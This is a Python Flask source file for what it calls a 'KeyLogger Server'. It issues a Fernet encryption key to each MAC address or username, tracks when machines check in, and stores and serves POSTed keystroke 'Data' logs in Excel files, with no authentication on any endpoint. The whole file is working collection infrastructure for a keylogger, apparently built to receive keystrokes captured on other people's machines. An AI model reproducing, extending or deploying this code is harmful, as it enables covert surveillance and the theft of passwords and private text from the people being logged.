from flask import Flask,jsonify,request
from cryptography.fernet import Fernet
import os
import pandas as pd
import datetime

#להכניס לטרמינל כדי להפעיל
# .venv\Scripts\activate
# flask --app logger_backend  run

app = Flask(__name__)
KEYS_FILE = "DB/keys.xlsx"
LOG_FILE = "DB/logs.xlsx"
Connection_FILE = os.path.abspath("./DB/connection.xlsx")

def load_keys():
    """Load keys from the Excel file into a dictionary."""
    keys = {}
    if os.path.exists(KEYS_FILE):
        df = pd.read_excel(KEYS_FILE)
        keys = dict(zip(df["MAC"], df["Key"]))  # Convert DataFrame to dictionary
    return keys

def save_key(mac, key):
    """Save a new MAC-key pair to the Excel file, updating if it already exists."""
    if os.path.exists(KEYS_FILE):
        df = pd.read_excel(KEYS_FILE)
    else:
        df = pd.DataFrame(columns=["MAC", "Key"])  # Create empty DataFrame if file doesn't exist

    # Convert byte key to string if necessary
    key_str = key.decode() if isinstance(key, bytes) else key

    if mac in df["MAC"].values:
        df.loc[df["MAC"] == mac, "Key"] = key_str  # Update existing MAC
    else:
        df = pd.concat([df, pd.DataFrame([[mac, key_str]], columns=["MAC", "Key"])], ignore_index=True)

    df.to_excel(KEYS_FILE, index=False)  # Save back to Excel

@app.route("/")
def hello_world():
    return "<p>KeyLogger Server</p>"

@app.route("/connection/<mac>")
def connection_alert(mac):
    print(mac)
    if not mac:
        return jsonify({"error": "MAC address required"}), 400

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Ensure the DB folder exists
    os.makedirs(os.path.dirname(Connection_FILE), exist_ok=True)

    # Check if the file exists and load it
    if os.path.exists(Connection_FILE):
        df = pd.read_excel(Connection_FILE, engine="openpyxl")
    else:
        df = pd.DataFrame(columns=["Date", "MAC"])  # Create empty DataFrame

    # Check if the MAC address is already in the DataFrame
    if mac in df["MAC"].values:
        df.loc[df["MAC"] == mac, "Date"] = timestamp  # Update timestamp
    else:
        new_row = pd.DataFrame([[timestamp, mac]], columns=["Date", "MAC"])
        df = pd.concat([df, new_row], ignore_index=True)

    # Save back to Excel
    df.to_excel(Connection_FILE, index=False, engine="openpyxl")

    print(f"Updated {mac} at {timestamp}")  # Debugging output
    return "True"

# @app.route("/connection")
# def connection_alert():
#     return "True"


@app.route('/user/<username>')
def get_key(username):
    keys = load_keys()  # Load existing keys from Excel

    if username in keys:
        return jsonify({"key": keys[username]})  # Return existing key as JSON
    else:
        key = Fernet.generate_key().decode()  # Generate new key
        save_key(username, key)  # Save the new key to Excel
        return jsonify({"key": key})  # Return new key as JSON


@app.route('/log', methods=['POST', 'GET'])
def log():
    if request.method == 'GET':
        mac = request.args.get("MAC")
        if not mac:
            return jsonify({"error": "MAC address required"}), 400

        if not os.path.exists(LOG_FILE):
            return jsonify({"error": "No logs available"}), 404

        df = pd.read_excel(LOG_FILE)
        print("Full DataFrame:\n", df)  # Debugging print

        logs = df[df["MAC"] == mac].to_dict(orient="records")
        print("Filtered Logs:\n", logs)  # Debugging print

        return jsonify(logs)
    if request.method == 'POST':
        data = request.get_json()
        print("Received Data:", data)  # Debugging line

        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        date_time = data.get("Date")
        mac = str(data.get("MAC"))
        log_data = data.get("Data")

        if not all([date_time, mac, log_data]):
            return jsonify({"error": "Missing fields"}), 400

        df = pd.DataFrame([[date_time, mac, log_data]], columns=["Date", "MAC", "Data"])

        if os.path.exists(LOG_FILE):
            existing_df = pd.read_excel(LOG_FILE)
            df = pd.concat([existing_df, df], ignore_index=True)

        df.to_excel(LOG_FILE, index=False)
        return jsonify({"message": "Log saved successfully"}), 201
